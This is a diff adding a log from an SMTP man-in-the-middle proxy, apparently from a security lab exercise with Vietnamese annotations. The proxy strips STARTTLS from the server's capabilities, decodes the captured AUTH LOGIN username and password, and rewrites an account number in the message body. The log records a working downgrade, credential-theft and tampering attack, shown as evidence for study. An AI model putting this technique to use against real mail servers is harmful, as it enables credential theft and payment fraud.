@@ -1,0 +1,54 @@
+[proxy] lang nghe 0.0.0.0:2525  ->  chuyen tiep toi 10.30.0.20:587 | strip=True | tamper=9999999999 -> 1029384756 | log=/root/evidence/atk/at06-proxy.log
+
+===== phien moi tu 10.30.0.50:38094, trung gian toi 10.30.0.20:587 (20:00:29) =====
+20:00:29 THU   -> PROXY : 220 mail1.congtyA.test ESMTP Postfix (Ubuntu)
+20:00:29 KHACH -> PROXY : EHLO vm-client
+20:00:29 THU   -> PROXY : 250-mail1.congtyA.test
+20:00:29 THU   -> PROXY : 250-PIPELINING
+20:00:29 THU   -> PROXY : 250-SIZE 10240000
+20:00:29 THU   -> PROXY : 250-VRFY
+20:00:29 THU   -> PROXY : 250-ETRN
+  [STRIP] AN DONG NAY KHONG cho khach thay: 250-STARTTLS
+20:00:29 THU   -> PROXY : 250-AUTH PLAIN LOGIN
+20:00:29 THU   -> PROXY : 250-ENHANCEDSTATUSCODES
+20:00:29 THU   -> PROXY : 250-8BITMIME
+20:00:29 THU   -> PROXY : 250-DSN
+20:00:29 THU   -> PROXY : 250-SMTPUTF8
+20:00:29 THU   -> PROXY : 250 CHUNKING
+20:00:29 KHACH -> PROXY : AUTH LOGIN
+  [AUTH] co che = LOGIN
+20:00:29 THU   -> PROXY : 334 VXNlcm5hbWU6
+  [AUTH] may thu hoi: 'Username:'
+20:00:29 KHACH -> PROXY : Z2lhbWRvYw==
+  [AUTH-THIEP] USERNAME = 'giamdoc'  (base64: Z2lhbWRvYw==)
+20:00:29 THU   -> PROXY : 334 UGFzc3dvcmQ6
+  [AUTH] may thu hoi: 'Password:'
+20:00:29 KHACH -> PROXY : TGFiQDIwMjY=
+  [AUTH-THIEP] PASSWORD = 'Lab@2026'  (base64: TGFiQDIwMjY=)
+20:00:29 THU   -> PROXY : 235 2.7.0 Authentication successful
+20:00:29 KHACH -> PROXY : MAIL FROM:<giamdoc@congtyA.test>
+20:00:29 THU   -> PROXY : 250 2.1.0 Ok
+20:00:29 KHACH -> PROXY : RCPT TO:<ketoan@congtyB.test>
+20:00:29 THU   -> PROXY : 250 2.1.5 Ok
+20:00:29 KHACH -> PROXY : DATA
+20:00:29 THU   -> PROXY : 354 End data with <CR><LF>.<CR><LF>
+  [TAMPER] da thay '9999999999' -> '1029384756' trong than thu (608 byte)
+20:00:29 THU   -> PROXY : 250 2.0.0 Ok: queued as 47E63A1D45
+20:00:29 KHACH -> PROXY : QUIT
+20:00:29 THU   -> PROXY : 221 2.0.0 Bye
+
+===== phien moi tu 10.30.0.50:48040, trung gian toi 10.30.0.20:587 (20:19:37) =====
+20:19:37 THU   -> PROXY : 220 mail1.congtyA.test ESMTP Postfix (Ubuntu)
+20:19:37 KHACH -> PROXY : EHLO vm-client
+20:19:37 THU   -> PROXY : 250-mail1.congtyA.test
+20:19:37 THU   -> PROXY : 250-PIPELINING
+20:19:37 THU   -> PROXY : 250-SIZE 10485760
+20:19:37 THU   -> PROXY : 250-ETRN
+  [STRIP] AN DONG NAY KHONG cho khach thay: 250-STARTTLS
+20:19:37 THU   -> PROXY : 250-ENHANCEDSTATUSCODES
+20:19:37 THU   -> PROXY : 250-8BITMIME
+20:19:37 THU   -> PROXY : 250-DSN
+20:19:37 THU   -> PROXY : 250-SMTPUTF8
+20:19:37 THU   -> PROXY : 250 CHUNKING
+20:19:37 KHACH -> PROXY : QUIT
+20:19:37 THU   -> PROXY : 221 2.0.0 Bye
